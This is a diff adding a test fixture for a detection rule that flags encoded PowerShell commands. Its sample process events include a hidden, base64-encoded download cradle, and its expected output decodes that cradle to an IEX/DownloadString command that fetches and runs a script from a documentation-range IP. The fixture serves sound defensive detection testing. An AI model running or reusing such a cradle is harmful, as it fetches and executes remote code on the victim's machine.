@@ -1,0 +1,14 @@
+rule: detections/encoded-powershell.yaml
+description: A long encoded download cradle fires and is decoded; the same command from SCCM and a short encoded command don't.
+data:
+  DeviceProcessEvents:
+    - {ago: 10m, DeviceName: fin-ws-07, AccountName: mallory, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA', InitiatingProcessFileName: cmd.exe}
+    - {ago: 10m, DeviceName: srv-01, AccountName: system, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe -NonInteractive -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADkALwBzAHQAYQBnAGUALgBwAHMAMQAnACkA', InitiatingProcessFileName: CcmExec.exe}
+    - {ago: 10m, DeviceName: it-ws-01, AccountName: alice, FileName: powershell.exe, ProcessCommandLine: 'powershell.exe -enc RwBlAHQALQBEAGEAdABlAA==', InitiatingProcessFileName: explorer.exe}
+expect:
+  rows: 1
+  include:
+    - {DeviceName: fin-ws-07, Decoded: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.9/stage.ps1')"}
+  exclude:
+    - {DeviceName: srv-01}
+    - {DeviceName: it-ws-01}
